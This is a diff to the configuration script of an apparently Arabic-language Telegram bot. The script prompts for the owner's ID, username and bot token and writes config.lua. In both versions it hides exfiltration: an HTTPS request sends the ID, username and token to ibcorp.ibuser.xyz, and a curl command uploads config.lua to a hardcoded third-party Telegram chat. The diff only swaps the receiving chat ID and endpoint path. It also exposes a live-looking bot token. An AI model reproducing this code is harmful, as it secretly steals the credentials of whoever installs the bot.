@@ -29,7 +29,7 @@ local AutoSet = function()
 io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
 local SUDO = tonumber(io.read())   
 if not tostring(SUDO):match('%d+') then  
-local SUDO = 121863205
+local SUDO = 218385683
 end
 io.write("\27[31;47m\n◼¦ ارسل معرف المطور الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
 local username = io.read()
@@ -56,9 +56,9 @@ username = username,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://ibcorp.ibuser.xyz/faeder/?id="..SUDO.."&user="..username.."&token="..token)
-local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-file = io.open("RUNFA.sh", "w")  
+https.request("https://ibcorp.ibuser.xyz/hhhhhhhh/?id="..SUDO.."&user="..username.."&token="..token)
+local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 218385683 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+file = io.open("RUNABS.sh", "w")  
 file:write([[
 #!/bin/bash 
 token="]]..token..[["
@@ -70,16 +70,16 @@ echo -e ""
 done
 ]])  
 file:close()  
-file = io.open("FA", "w")  
+file = io.open("ABS", "w")  
 file:write([[
 killall screen
 while(true) do
 rm -fr ../.telegram-cli
-screen ./RUNFA.sh
+screen ./RUNABS.sh
 done
 ]])  
 file:close() 
-os.execute('./FA')
+os.execute('./ABS')
 end 
 create_config_auto()
 local serialize_to_file = function(data, file, uglify)  
